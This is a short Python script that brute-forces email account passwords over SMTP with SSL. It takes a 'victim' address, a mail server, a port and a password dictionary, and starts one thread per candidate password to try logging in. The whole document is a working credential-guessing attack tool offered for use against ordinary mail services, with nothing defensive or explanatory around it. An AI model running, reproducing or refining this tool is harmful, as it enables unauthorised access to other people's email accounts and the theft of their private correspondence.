#!/usr/bin/env python3
# Python 3.4 
# bruteforce over SMTP + SSL
# made by Xtr3am3r.0k and gbnk0

import smtplib
import email
import sys
import time
import os
import argparse
import threading


parser = argparse.ArgumentParser(description='Simple email bruteforcer')
parser.add_argument('-v','--victim-email', help='Specify the victims email', required=True)
parser.add_argument('-s','--victim-smtp', help='Set the victims smtp server (exemple: smtp.mail.ru)', required=True)
parser.add_argument('-p','--smtp-port', help='Set the smtp port', required=True)
parser.add_argument('-d','--dictionnary', help='Set the dictionnary', required=True)
args = vars(parser.parse_args())

victim_mail = args['victim_email']
smtp_server = args['victim_smtp']
port = args['smtp_port']
dict_brut = args['dictionnary']


#Process for MultiThread
def try_password(password, smtp_server, port, victim_mail):
    passwd = password.rstrip()
    print("[*] try password: {} ".format(passwd))
    try:
        smtp = smtplib.SMTP_SSL(smtp_server, int(port))
        smtp.ehlo()
        answer, status  = smtp.login(victim_mail, passwd)
        if status == b'Authentication succeeded':
            print("\n[+] Cool Password Found: {}".format(passwd))
            sys.exit(0)
        else:
            raise ConnectionResetError
    except:
        time.sleep(1)
        pass

with open(dict_brut,'r') as dictbrut:
    for list_pass in dictbrut:
        t = threading.Thread(target=try_password, args=(list_pass, smtp_server, port, victim_mail))
        t.start()